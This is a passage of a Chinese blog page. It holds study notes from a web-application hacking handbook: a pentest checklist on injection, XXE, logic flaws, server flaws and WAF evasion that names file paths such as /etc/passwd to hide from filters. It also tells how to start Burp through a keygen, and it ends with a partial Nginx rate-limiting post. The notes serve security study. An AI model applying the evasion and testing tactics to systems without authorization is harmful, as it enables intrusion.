<li>如果应用程序的某个功能会根据参数值返回特定的内容，则尝试在注入额外的参数值，观察响应结果是否不变，例如可注入：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529155732.png"></li>
<li>如果响应内容不变，则说明没有检查额外参数注入，有可能存在参数注入漏洞。此时，如果恰好注入某个正确命名的键值对，有可能会改变应用程序的处理逻辑；</li>
</ul>
<h3 id="测试-XXE-注入"><a href="#测试-XXE-注入" class="headerlink" title="测试 XXE 注入"></a>测试 XXE 注入</h3><blockquote>
<p>XXE：或许是 XML external enterty 的缩写？</p>
</blockquote>
<ul>
<li>由于 XML 语法支持引用外部内容，因此当用户向服务器提交 XML 时，有可能可以实施外部实体注入攻击；</li>
<li>当应用程序返回所提交的 XML 中的某个节点值时，则\通过实体注入并赋值给相应字段，来获取外部内容；例如：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529160333.png"></li>
<li>如果不知道返回的字段名称，则可以通常观察响应时间是否超时来判断是否注入成功，方法将外部实体设置为某个不存在的外部服务，例如 “<a target="_blank" rel="noopener" href="http://192.168.1.1:25"，">http://192.168.1.1:25&quot;，</a></li>
</ul>
<h2 id="测试逻辑缺陷-1"><a href="#测试逻辑缺陷-1" class="headerlink" title="测试逻辑缺陷"></a>测试逻辑缺陷</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529160545.png"></p>
<h3 id="确定关键的受攻击面"><a href="#确定关键的受攻击面" class="headerlink" title="确定关键的受攻击面"></a>确定关键的受攻击面</h3><ul>
<li>由于逻辑缺陷在应用程序中无处不在，表现形式多样，为了提高测试效率，可从最常见的位置开展测试；</li>
<li>常见位置包括：<ul>
<li>包含多个阶段的功能；</li>
<li>重要的安全功能，例如登录；</li>
<li>信任边界的状态变化，例如登录后，由匿名用户变成了注册用户；</li>
<li>检查和修改交易价格和数量；</li>
</ul>
</li>
</ul>
<h3 id="测试多阶段过程-1"><a href="#测试多阶段过程-1" class="headerlink" title="测试多阶段过程"></a>测试多阶段过程</h3><ul>
<li>如果某个包含多阶段的功能需要按照预定的顺序提交多个请求，则改变这些请求的顺序，例如直接忽略某个或多个步骤、重复访问某个步骤、跳回前面的步骤等，尽量发挥想象力，创造各种访问顺序的组合；</li>
<li>不同的步骤有可能由不同的 URL 来表示，也有可能由相同 URL 中的不同参数来表示，了解其表示办法，以确保访问顺序按预期进行；</li>
<li>尝试提取 A 步骤的参数，放到 B 步骤中；如果响应出现异常，则思考如何利用其中的逻辑漏洞 ；</li>
<li>如果在多阶段的功能中，存在多个用户操作相同的数据，则可以提取 A 用户的参数，放到 B 用户的请求中提交，观察应用程序如何响应；</li>
<li>思考开发者做出的假设和某种假设背面可能存在漏洞的位置，设计相应的请求办法，来探查判断是否正确；</li>
<li>当打乱顺序访问多阶段功能时，如果应用程序出现异常行为，分析收到的错误或调试消息，从中获取有用的线索，推测应用程序的逻辑，以便调整优化攻击；</li>
</ul>
<h3 id="测试不完整的输入"><a href="#测试不完整的输入" class="headerlink" title="测试不完整的输入"></a>测试不完整的输入</h3><ul>
<li>有些应用程序的功能涉及处理很多个用户提交的参数，并根据参数的不同值，调用不同的代码分支进行处理。此时有可能存在分支漏洞，例如未全面覆盖各种条件；</li>
<li>轮流测试每一个参数，在请求中删除相应的参数键值对，观察应用程序的响应。如果出现错误，观察错误消息中是否包含逻辑错误的线索；</li>
<li>如果所测试的功能刚好是一个多阶段功能，则应测试整个过程，因为有可能 A 步骤的数据会被保存在会话中，然后在 B 步骤中使用；</li>
</ul>
<h3 id="测试信任边界"><a href="#测试信任边界" class="headerlink" title="测试信任边界"></a>测试信任边界</h3><ul>
<li>探查应用程序如何处理用户的不同身份状态的变换（例如从匿名用户变为已注册用户）；留意相关功能，当用户提供一定的身份信息后，就可以实现身份状态的转变，例如提供个人资料实现注册，或者提供相关信息恢复账号等功能；</li>
<li>尝试寻找实现身份转变的各种办法，例如在 A 功能模块获取被信任的身份，然后直接跳转到 B 功能模块进行访问（这种跳转在正常操作的情况下不会发生），例如在恢复账号的功能中，先完成部分步骤，然后直接切换访问某个只能由已验证用户访问的页面，以测试应用程序是否会在切换过程中，没有做权限权限，授权用户预期之外的权限；</li>
<li>尝试确定是否可以通过利用某些高权限功能来直接或间接的访问或推测数据；</li>
</ul>
<h3 id="测试交易逻辑"><a href="#测试交易逻辑" class="headerlink" title="测试交易逻辑"></a>测试交易逻辑</h3><ul>
<li>如果应用程序设置交易限额，尝试提交负值，观察响应；如果没有报错，就可以通过提交负值进行反向交易；</li>
<li>分析是否有可能通过一连串的交易，让应用程序进行某个特定状态，在该特定状态下，可以实现某些目的。例如在多个账号之间，进行多次的小额交易，然后累积出某个应用程序原本不允许发生的余额；</li>
<li>如果应用程序根据用户提交的数据或操作，作为某种调整价格或其他敏感值的依据。可进一步了解应用程序使用的算法和调整逻辑。观察这种调整是一次性行为，还是会根据用户的操作反复进行修改；</li>
<li>分析这个调整逻辑和调整过程，看有没有办法找到一种操作组合，让其调整逻辑出现自相矛盾；</li>
</ul>
<h2 id="测试共享主机漏洞"><a href="#测试共享主机漏洞" class="headerlink" title="测试共享主机漏洞"></a>测试共享主机漏洞</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529173848.png"></p>
<h3 id="测试共享基础架构之间的隔离"><a href="#测试共享基础架构之间的隔离" class="headerlink" title="测试共享基础架构之间的隔离"></a>测试共享基础架构之间的隔离</h3><ul>
<li>如果应用程序运行于某种共享的硬件环境中时，那么一般需要给开发者提供某种访问机制，让其可以访问和管理该共享环境，因此，可以思考如下问题：<ul>
<li>远程访问机制是否使用安全的协议？</li>
<li>该共享的基础硬件架构，是否实施了安全强化？</li>
<li>客户端是否有可能访问其在正常情况下无法的文件、数据和其他资源？</li>
<li>客户端是否可以获得一个交互式的 shell 环境，并可以执行任意的命令？</li>
</ul>
</li>
<li>如果共享硬件为用户提供某个管理程序，让其自定义共享环境，考虑攻击该应用程序，以间接实现对运行在其中的程序的攻击；</li>
<li>如果可以通过应用程序运行命令、注入 SQL或访问任意文件，则仔细研究是否可以通过这些漏洞，攻击托管在相同共享硬件中的其他应用程序；</li>
</ul>
<h3 id="测试使用-ASP-托管的应用程序之间的隔离"><a href="#测试使用-ASP-托管的应用程序之间的隔离" class="headerlink" title="测试使用 ASP 托管的应用程序之间的隔离"></a>测试使用 ASP 托管的应用程序之间的隔离</h3><blockquote>
<p>ASP：application service provider；</p>
</blockquote>
<ul>
<li>如果应用程序使用 ASP 托管服务，那么一般来说，托管服务供应商会提供很多共享的常用组件，例如日志、管理界面、数据库等；这些组件被多个应用程序所共享使用；尝试攻击应用程序使用的这些共享组件，进而有可能间接实现对其他应用程序的攻击；</li>
<li>如果托管环境中使用某个常见的数据库，可使用数据库扫描工具如 NGSSquirrel 之类的工具，对该数据库进行详细的检查，包括配置、补丁版本、表结构以及权限控制等信息；然后上网搜索最新的漏洞信息，并加以利用，从而可以将攻击范围扩展到使用该共享数据库的所有应用程序；</li>
</ul>
<h2 id="测试-Web-服务器漏洞"><a href="#测试-Web-服务器漏洞" class="headerlink" title="测试 Web 服务器漏洞"></a>测试 Web 服务器漏洞</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210529175548.png"></p>
<h3 id="测试默认密码"><a href="#测试默认密码" class="headerlink" title="测试默认密码"></a>测试默认密码</h3><ul>
<li>根据应用程序解析结果，推断所使用的 Web 服务器软件和相关技术，以及是否包含可访问的管理接口；</li>
<li>对 Web 服务器实施端口扫描，确定除了应用程序外，其他可能在运行的程序；</li>
<li>如果已知端口号，查询相关文档和常用的默认密码，检查是否密码有效；</li>
<li>如果密码无效，使用第 21 章的技巧，尝试猜测有效的密码；</li>
<li>如果能够访问管理接口，检查可用的功能，看是否可以加以利用，间接攻破主机和目标应用程序；</li>
</ul>
<h3 id="测试默认内容"><a href="#测试默认内容" class="headerlink" title="测试默认内容"></a>测试默认内容</h3><ul>
<li>使用 Nikto 等工具进行扫描，找出服务器上存在的，但不属于应用程序负责的默认内容；</li>
<li>使用搜索引擎和相关网站（如 <a target="_blank" rel="noopener" href="http://www.exploit-db.com),查找相关服务器软件的默认内容和功能;如果可以,在本地安装这些软件,并测试其可被利用的默认功能;/">www.exploit-db.com），查找相关服务器软件的默认内容和功能；如果可以，在本地安装这些软件，并测试其可被利用的默认功能；</a></li>
<li>检查默认内容，分析里面是否包含可用于攻击服务器软件或目标应用唾弃的功能或漏洞；</li>
</ul>
<h3 id="测试危险的-HTTP-方法"><a href="#测试危险的-HTTP-方法" class="headerlink" title="测试危险的 HTTP 方法"></a>测试危险的 HTTP 方法</h3><ul>
<li>使用 OPTIONS 罗列应用程序接受的所有可用方法（不同的路径，可用的方法不尽相同）；可以使用第三方工具（如 Paros）进行扫描，提交检查的效率；</li>
<li>手动测试每一种方法，确定其确实可用；</li>
<li>如果发现某些 WebDAV 方法被激活（WebDAV 是一种 HTTP 扩展技术，它允许客户端实现对远程内容的操作），则可以利用一些可激活该功能的客户端进行探查（如可在 Microsoft FrontPage 或 IE 中打开 Open as Web Folder 选项）；</li>
</ul>
<h3 id="测试代理功能"><a href="#测试代理功能" class="headerlink" title="测试代理功能"></a>测试代理功能</h3><ul>
<li>使用 GET 和 CONNECT 请求，尝试将 Web 服务器作为代理服务器，连接因特网上的其他服务器，并获取其上面的内容；</li>
<li>尝试访问目标应用程序所有的网络环境中的不同 IP 地址和端口；</li>
<li>尝试指定 127.0.0.1 作为目标主机，连接 Web 服务器上的常用端口号；</li>
</ul>
<h3 id="测试虚拟主机配置不当"><a href="#测试虚拟主机配置不当" class="headerlink" title="测试虚拟主机配置不当"></a>测试虚拟主机配置不当</h3><blockquote>
<p>同一台服务器可能部署多个应用程序，此时服务器软件通过 host 消息头中的值，来区分应将流量转发给哪个应用程序；</p>
</blockquote>
<ul>
<li>使用以下技巧向根目录提交 GET 请求<ul>
<li>正确的 host 消息头；</li>
<li>恶意的 host 消息头；</li>
<li>host 消息头写入服务器的 IP 地址；</li>
<li>删除 host 消息头；</li>
</ul>
</li>
<li>比较这些请求返回的响应。通常在 host 消息头中使用服务器的 IP 地址时，有可能获得目录列表，以及其他各种默认内容；</li>
<li>如果应用程序出现异常行为，提取造成异常行为的主机名称，重复应用程序的解析环节。并使用 -vhost 选项再运行一次 Nikto 扫描，以便尽量找出在前面所有环节中忽略的默认内容；</li>
</ul>
<h3 id="测试-Web-服务器软件漏洞"><a href="#测试-Web-服务器软件漏洞" class="headerlink" title="测试 Web 服务器软件漏洞"></a>测试 Web 服务器软件漏洞</h3><ul>
<li>使用 Nessus 之类的扫描器，查找 Web 服务器软件中的所有已知漏洞；</li>
<li>浏览 Security Focus、Bugtraq、Full Disclosure 等网站，查找最新发现尚未修复的漏洞消息；</li>
<li>如果应用程序由第三方开发，检查其是否自带服务器软件（通常是某个开源软件）；如果有，查找该软件所有已知漏洞（注意：服务器的版本信息有可能被修改）；</li>
<li>如果可以，在本地安装相应的软件，在本地自行测试，查找未被发现的或广泛流传的新漏洞；</li>
</ul>
<h3 id="测试-Web-应用程序防火墙"><a href="#测试-Web-应用程序防火墙" class="headerlink" title="测试 Web 应用程序防火墙"></a>测试 Web 应用程序防火墙</h3><ul>
<li>在请求中提交任意的参数名称，并在在参数值中使用常见的有效攻击荷载（最好是在响应中会返回该参数值的位置），如果请求被阻止，说明应用程序有可能某种防御机制（第三方组件）；</li>
<li>如果某个路径会在响应中返回请求参数，则提交一系列模糊测试字符串，以及它们相应的编码形式，用来探查应用程序的防御机制；</li>
<li>对正常的参数重复相同的测试，看问题是否会重现；如果会的话，可以进一步确认防御机制的存在；</li>
<li>查询防御机制中常见的关键字匹配，在所有的模糊测试字符串，避免出现这些字符串，而是使用不可能存在的一些其他字符串作为有效的攻击荷载，例如：<ul>
<li>检索文件时，避免使用 /etc/passwd 或者 /windows/system32/config/sam 之类的字符串；</li>
<li>XSS 攻击中，避免使用 &lt;script> 标签；避免使用 alert() 或 xss 等字样；</li>
</ul>
</li>
<li>如果插入在特定位置的请求被阻止，则可以尝试在其他位置提交相同的参数，例如：<ul>
<li>GET 请求的 URL 中；</li>
<li>POST 请求主体中；</li>
<li>POST 请求的 URL 中；</li>
</ul>
</li>
<li>如果应用程序使用 ASP.NET 作为开发语言，则可以尝试在 cookie 中提交参数，因为当 ASP 程序在查询字符串或消息主体中查询不到指定的参数时，默认会跑到 cookie 中去查询；</li>
<li>尝试在第 4 章提到的其他插入方法，检查是否某些方式未被机制所覆盖；</li>
<li>找出所有可以使用非标准格式（如序列化或编码）提交参数的位置；如果找不到，可以尝试在多个变量中，对攻击字符串使用合并 concatenation + 拆分 spanning 和合并 concatenation / 拆分 spanning 两种方式进行组合（如果应用程序使用 ASP.NET 开发，可以考虑使用 HPP，HTML Parameter Polution，通过同一变量的不同变化来串联攻击字符串）；</li>
</ul>
<h2 id="其他检查"><a href="#其他检查" class="headerlink" title="其他检查"></a>其他检查</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601085820.png"></p>
<h3 id="测试基于-DOM-的攻击"><a href="#测试基于-DOM-的攻击" class="headerlink" title="测试基于 DOM 的攻击"></a>测试基于 DOM 的攻击</h3><ul>
<li>审查应用程序的前端 JS 代码，寻找漏洞，看是否可以通过插入某个专门设计的 URL 到页面中，从而能够引入恶意脚本，实现 XSS 攻击或者重定向攻击；审查的内容涵盖静态和动态生成的所有 JS 脚本；</li>
<li>留意调用以下 API 的位置，因此这些 API 功能很强大，可以用来引入恶意脚本；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090249.png"></li>
<li>追踪 JS 代码处理数据的流程和逻辑，检查其对数据做了何种操作。如果数据的处理，调用了以下 API，则可能存在 XSS 漏洞：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090411.png"></li>
<li>如果数据处理调用了以下 API，则可能存在重定向漏洞；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210601090447.png"></li>
</ul>
<h3 id="测试本地隐私漏洞"><a href="#测试本地隐私漏洞" class="headerlink" title="测试本地隐私漏洞"></a>测试本地隐私漏洞</h3><ul>
<li>检查拦截器的日志，寻找包含 set-cookie 指令的响应，指令中可能包含 expire 属性，表示浏览器会将该 cookie 保存到该时间点。检查持久性 cookie 中是否传送敏感数据；</li>
<li>如果 cookie 中包含敏感数据，则攻击者就可以利用这些数据，即使数据被加密过了，攻击者仍然可以将它们提交给服务端，访问该 cookie 能够访问的数据或功能；</li>
<li>当某个 HTTP 响应包含敏感数据时，留意响应报头中的缓存指令相关的字段。如果没有特别指示不缓存的话，浏览器默认都是会缓存的，相关的字段包括：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210602072751.png"></li>
<li>检查应用程序使用 URL 参数传送敏感数据的所有情况，因为这种情况意味着这些敏感数据会保存在很多地方，例如浏览器的历史记录、服务端的日志等；</li>
<li>检查所有让用户提交敏感数据的表单，如果表单中没有关闭自动填充功能，则意味着输入的数据已经被浏览器保存起来了。</li>
</ul>
<h3 id="测试脆弱的-SSL-加密算法"><a href="#测试脆弱的-SSL-加密算法" class="headerlink" title="测试脆弱的 SSL 加密算法"></a>测试脆弱的 SSL 加密算法</h3><ul>
<li>如果应用程序使用 SSL 进行通信，可以使用 THCSSLCheck 等工具，检查其所使用的加密算法和协议。</li>
<li>如果应用程序使用脆弱或过时的加密算法和协议，攻击者就可能有机会破译或降级 SSL 通信，访问其中包含的敏感数据；</li>
<li>虽然有些 Web 服务器软件表面声明支持某些脆弱算法和协议，但实际上可能并没有默认开启这种支持，因此在使用 THCSSLCheck 工具进行检查之前，可以使用 Opera 浏览器，通过指定的脆弱协议尝试完成一次握手，以确定是否真的支持。</li>
</ul>
<h3 id="检查同源策略配置"><a href="#检查同源策略配置" class="headerlink" title="检查同源策略配置"></a>检查同源策略配置</h3><ul>
<li>检查 /crossdomain.xml 文件，如果应用程序未设置同源范围，例如 allow-access-from domain="*"，则意味着任何来自其他域的 Flash 对象可以访问应用程序，检索所有数据，并执行任何用户操作；</li>
<li>检查 /clientaccesspolicy.xml，原因同上；</li>
<li>可在请求中的 Origin 消息头添加其他域名，然后检查响应中的 Access-Control 字段，测试应用程序如何处理跨域请求；</li>
</ul>
<h2 id="检查信息泄露"><a href="#检查信息泄露" class="headerlink" title="检查信息泄露"></a>检查信息泄露</h2><ul>
<li>在测试应用程序的过程中，留意所有可能泄露其所使用的技术、程序内部结构、功能、错误原因等的信息；</li>
<li>如果发现不常见的错误，使用搜索引擎进行查询（可使用搜索引擎的高级特性来缩小查询范围，例如指定 filetype）；<ul>
<li>查询所有有关该错误信息的讨论，以及查看出现相同问题的其他站点。因为有可能其他站点显示的错误信息内容更加丰富，有助于了解错误的发生原因。</li>
<li>另外还可以通过搜索引擎的缓存搜索一些历史错误消息；</li>
</ul>
</li>
<li>使用 google 代码搜索功能，搜索与特定错误消息相关的公开代码；</li>
<li>搜索可能被硬编码到应用程序源代码中的错误消息片段（可使用高级搜索特性，指定特定的代码语言或相关的已知细节，例如：lang:php package:mail）；</li>
<li>如果在错误消息中发现第三方库或组件的名称，在搜索引擎中查询这些名称；</li>
</ul>
<h1 id="22-其他"><a href="#22-其他" class="headerlink" title="22. 其他"></a>22. 其他</h1><h2 id="工具使用说明"><a href="#工具使用说明" class="headerlink" title="工具使用说明"></a>工具使用说明</h2><h3 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
<li>先使用 java -jar <keygen.jar> 来启动 keygen 程序；</li>
<li>再用 keygen 里面提供的命令来启动 burp，并进行注册；</li>
<li>之后每一次启动，都需要使用 keygen 作为参数来启动 burp，可将其做成快捷方式放在桌面上，点击快速启动</li>
</ul>
<blockquote>
<p> 备注：由于 java 命令参数用到 noverify，但该参数在新版本的 jdk 中已经废弃，因此需要单独安装一下 1.8 版本的 openjdk，并使用命令 update-alternatives --config java 来更改默认使用的版本</p>
</blockquote>
<h2 id="手机端测试"><a href="#手机端测试" class="headerlink" title="手机端测试"></a>手机端测试</h2><h3 id="电脑端添加监听"><a href="#电脑端添加监听" class="headerlink" title="电脑端添加监听"></a>电脑端添加监听</h3><ul>
<li>Proxy->Options->Proxy Listeners，点击 add 按钮添加新的监听器</li>
<li>Bind to port 可设置为 8082</li>
<li>Bind to address 选择 All interfaces</li>
<li>保存</li>
</ul>
<h3 id="手机端证书安装"><a href="#手机端证书安装" class="headerlink" title="手机端证书安装"></a>手机端证书安装</h3><ul>
<li>导出证书</li>
<li>使用 openssl 将证书转换为 crt 格式，openssl x509 -in mycert.der -inform DER -out mycert.pem</li>
<li>将证书拷贝到手机上（例如用微信）</li>
<li>安装证书（微信收到证书文件后，点击，用其他应用打开，会提示安装证书）</li>
</ul>
<h3 id="手机端设置代理"><a href="#手机端设置代理" class="headerlink" title="手机端设置代理"></a>手机端设置代理</h3><ul>
<li>编辑 wifi 属性</li>
<li>展开高级选项</li>
<li>将代理设置为手动</li>
<li>填写局域网已安装 burp 电脑的 IP 地址和监听端口，保存</li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li>手机端：使用浏览上网</li>
<li>电脑端：查看 burp，确认可拦截网络连接</li>
</ul>
<h1 id="23-经验总结"><a href="#23-经验总结" class="headerlink" title="23. 经验总结"></a>23. 经验总结</h1><ul>
<li>启用 Following Redirections：菜单栏 -> Repeater -> Following Redirections；</li>
<li>添加目标域名：Target -> Scope，可直接手工输入（静态域名或者正则匹配），也可在 Site map 右键点击目标域名，Add to scope；</li>
<li>添加 Exclude 域名：该功能同样重要，这样可以避免让 Burp 尝试去触发某些危险动作，如 logout, reset 等会中断测试流程的动作；</li>
<li>关键功能：手工浏览被动抓取、爬虫主要抓取、自动化扫描、自定义自动化攻击、手动攻击、生成虚拟数据、数据编码；</li>
<li></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/05/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%AE%9D%E5%85%B8/" data-id="cm1c2i81t0063pkhp2aqr9nua" data-title="黑客攻防技术宝典" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Nginx 配置" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/12/Nginx%20%E9%85%8D%E7%BD%AE/" class="article-date">
  <time class="dt-published" datetime="2020-11-12T09:08:00.000Z" itemprop="datePublished">2020-11-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/12/Nginx%20%E9%85%8D%E7%BD%AE/">Nginx 常用配置</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-限速-Rate-Limiting"><a href="#1-限速-Rate-Limiting" class="headerlink" title="1.限速 Rate Limiting"></a>1.限速 Rate Limiting</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>使用了水池算法，即水池的流入水量代表进入的请求，水池的流出水量代表转发请求给应用程序；当设置了某个水池的容量后，如果在某段时间，流入的水量比较大，超过了流出的水量，将导致水池中的水溢出；溢出的水即代表被拒绝的请求；</p>
<h3 id="实现办法"><a href="#实现办法" class="headerlink" title="实现办法"></a>实现办法</h3><h4 id="基本设置"><a href="#基本设置" class="headerlink" title="基本设置"></a>基本设置</h4><p>limit_req_zone 表示限速区域 </p>
<ul>
<li>第一个参数表示限速匹配条件的关键字，此处为二进制的IP地址 $binary_remote_addr；</li>
<li>第二个参数表示限速区域名称，此处为 mylimi，冒号后面表示用来存储请求数据的内存空间大小，此处设置为 10MB（每 MB 大约可以存储 16000 个二进制 IP  地址，因此 10 MB 大约可以存储 16万个IP地址）；</li>
<li>第三个参数 rate 表示限制的速度，此处为 10r&#x2F;s，表示每秒10个请求，也即每 100 毫秒 1 个请求；</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=mylimit:<span class="number">10m</span> rate=10r/s;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> /login/ &#123; </span><br><span class="line">        <span class="attribute">limit_req</span> zone=mylimit; // 在某个路径 <span class="section">location</span> 中定义  zone，表示对当前路径进行限速</span><br><span class="line">        proxy_pass http://my_upstream;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="应对突发"><a href="#应对突发" class="headerlink" title="应对突发"></a>应对突发</h4><p>当第二个请求到达的时间，距离上一个请求的时间少于100毫秒时，Nginx 将返回 503 的响应；为了解决突发的高峰访问的场景，引入了另外两个控制限速的关键字，分别如下：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /login/ &#123;</span><br><span class="line">    <span class="attribute">limit_req</span> zone=mylimit burst=<span class="number">20</span> nodelay;</span><br><span class="line"> </span><br><span class="line">    <span class="attribute">proxy_pass</span> http://my_upstream;</span><br><span class="line">&#125;：</span><br></pre></td></tr></table></figure>

<p>burst 表示增加一个等待队列，当下一个请求距离上一个请求少于 100 毫秒时，就先将其放入队列中；此处 burst&#x3D;20 表示同时最多可以有20个请求在排队；如果某个请求进来时，前面已经 20 个请求在排除，则该请求将被拒绝；</p>
<h4 id="免等待队列"><a href="#免等待队列" class="headerlink" title="免等待队列"></a>免等待队列</h4><p>虽然 burst 为突发的访问高峰的请求增加了一个缓冲的机制，但它的缺点是让响应变慢了，因为有些请求，例如队列中的第 20 个请求，将等候 2 秒钟的时间后，再会转发给应用程序进行响应；为了避免等待，引入了 nodelay 关键字，它表示请求到达后，将立即被转发给应用程序进行处理，不需等待，但是仍然会占用队列中的一个等待名额；这意味着如果某个时刻同一个 IP 同时发送 21 个请求，则前面 20 个请求将直接转发给应用程序处理，而第 21 个将被拒绝；队列中占用的名额每 100 毫秒释放一个；</p>
<h4 id="两阶段限速"><a href="#两阶段限速" class="headerlink" title="两阶段限速"></a>两阶段限速</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=ip:<span class="number">10m</span> rate=5r/s;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">limit_req</span> zone=ip burst=<span class="number">12</span> delay=<span class="number">8</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://website;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处仍然建立了能够应对额外 12 个突发请求的队列，但是增加了 delay 参数，并将值设置为 8，它表示队列中的前 8 个请求使用免等待策略，而剩下的 4 个请求需要等待；此时如果进行第 13 个请求，将被拒绝；</p>
<h4 id="高级设置"><a href="#高级设置" class="headerlink" title="高级设置"></a>高级设置</h4><h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><ul>
<li>先通过 geo 指令建立了一份白名单，普通请求的 $limit 值被默认设置为为 1，指定 IP 段的请求则被设置为 0 ；</li>
<li>再通过 map 指令将 $limit 值为 1 的请求的 $limit_key 属性值设置为 $binary_remote_addr，将$limit 值为 0 的请求设置为空字符串；</li>
<li>最后在 limit_req_zone 指令中，$limit_key 的值若为空字符串的请求，将被忽略，不会施加限制；</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">geo</span> <span class="variable">$limit</span> &#123;</span><br><span class="line">    <span class="attribute">default</span> <span class="number">1</span>;</span><br><span class="line">    10.0.0.0/8 0;</span><br><span class="line">    192.168.0.0/24 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="attribute">map</span> <span class="variable">$limit</span> <span class="variable">$limit_key</span> &#123;</span><br><span class="line">    0 &quot;&quot;;</span><br><span class="line">    1 $binary_remote_addr;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="attribute">limit_req_zone</span> <span class="variable">$limit_key</span> zone=req_zone:<span class="number">10m</span> rate=5r/s;</span><br><span class="line"> </span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">limit_req</span> zone=req_zone burst=<span class="number">10</span> nodelay;</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="单个路径使用多个-limit-req"><a href="#单个路径使用多个-limit-req" class="headerlink" title="单个路径使用多个 limit_req"></a>单个路径使用多个 limit_req</h5><p>当使用多个 limit_req 时，如果一个请求被多个 limit_req 同时匹配到，则最长 delay 时间的那个将生效；如果被任意一个 limit_req 拒绝，则请求将拒绝；</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="attribute">limit_req_zone</span> <span class="variable">$limit_key</span> zone=req_zone:<span class="number">10m</span> rate=5r/s;</span><br><span class="line">    <span class="attribute">limit_req_zone</span> <span class="variable">$binary_remote_addr</span> zone=req_zone_wl:<span class="number">10m</span> rate=15r/s;</span><br><span class="line"> </span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="comment"># ...</span></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">limit_req</span> zone=req_zone burst=<span class="number">10</span> nodelay;</span><br><span class="line">            <span class="attribute">limit_req</span> zone=req_zone_wl burst=<span class="number">20</span> nodelay;</span><br><span 